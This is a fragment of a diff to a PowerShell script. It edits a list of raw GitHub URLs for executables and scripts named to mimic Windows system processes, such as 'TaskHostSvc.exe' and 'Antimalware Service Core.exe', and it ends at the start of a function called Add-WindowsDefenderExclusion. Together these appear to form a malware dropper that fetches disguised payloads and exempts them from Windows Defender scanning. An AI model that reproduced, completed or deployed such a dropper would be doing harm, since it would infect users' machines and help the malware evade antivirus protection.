@@ -15,8 +15,7 @@ $urls = @(
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Newtonsoft.Json.dll",
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/tskdllhost.ps1",
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/TaskHostSvc.exe",
-    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Antimalware Service Core.exe",
-    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/WinHostSvc.exe"
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Antimalware Service Core.exe"
 )
 function Add-WindowsDefenderExclusion {
     param (
